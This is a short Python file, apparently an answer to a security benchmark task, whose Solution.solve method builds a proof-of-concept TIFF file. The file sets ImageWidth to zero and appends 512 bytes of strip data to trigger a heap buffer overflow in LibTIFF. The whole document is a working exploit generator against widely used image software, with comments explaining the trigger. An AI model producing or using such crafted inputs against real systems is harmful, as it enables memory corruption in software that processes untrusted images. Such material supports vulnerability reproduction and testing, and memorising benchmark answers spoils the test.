import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: LibTIFF (Heap Buffer Overflow due to zero width)
        """
        # We construct a TIFF file with ImageWidth=0.
        # Vulnerable versions calculate buffer size as 0 (based on width),
        # then attempt to read StripByteCounts bytes into it, causing a heap overflow.
        
        # Little Endian TIFF Header: "II" (0x4949), 42 (0x002A), Offset to IFD (8)
        poc = bytearray(struct.pack('<2sHI', b'II', 42, 8))
        
        strip_len = 512  # Large enough to overflow a small heap chunk
        
        # Calculate offsets
        # Header: 8 bytes
        # IFD Count: 2 bytes
        # Entries: 10 entries * 12 bytes = 120 bytes
        # Next IFD: 4 bytes
        # Total IFD size: 126 bytes
        # IFD starts at 8, ends at 134
        
        offset_bps = 134
        # BPS data is 3 shorts (6 bytes), ends at 140
        offset_strip = 140
        
        # TIFF Tags
        tags = [
            (256, 4, 1, 0),            # ImageWidth: 0 (The Trigger)
            (257, 4, 1, 10),           # ImageLength: 10
            (258, 3, 3, offset_bps),   # BitsPerSample: 8,8,8 (offset)
            (259, 3, 1, 1),            # Compression: None
            (262, 3, 1, 2),            # PhotometricInterpretation: RGB
            (273, 4, 1, offset_strip), # StripOffsets
            (277, 3, 1, 3),            # SamplesPerPixel: 3
            (278, 4, 1, 10),           # RowsPerStrip: 10
            (279, 4, 1, strip_len),    # StripByteCounts
            (284, 3, 1, 1)             # PlanarConfiguration: Chunky
        ]
        
        # Sort tags by ID as required by TIFF spec
        tags.sort(key=lambda x: x[0])
        
        # Write IFD
        poc.extend(struct.pack('<H', len(tags))) # Num entries
        for tag, type_, count, val in tags:
            poc.extend(struct.pack('<HHII', tag, type_, count, val))
        poc.extend(struct.pack('<I', 0)) # Next IFD offset
        
        # Write BitsPerSample data
        poc.extend(struct.pack('<HHH', 8, 8, 8))
        
        # Write Strip Data
        poc.extend(b'A' * strip_len)
        
        return bytes(poc)
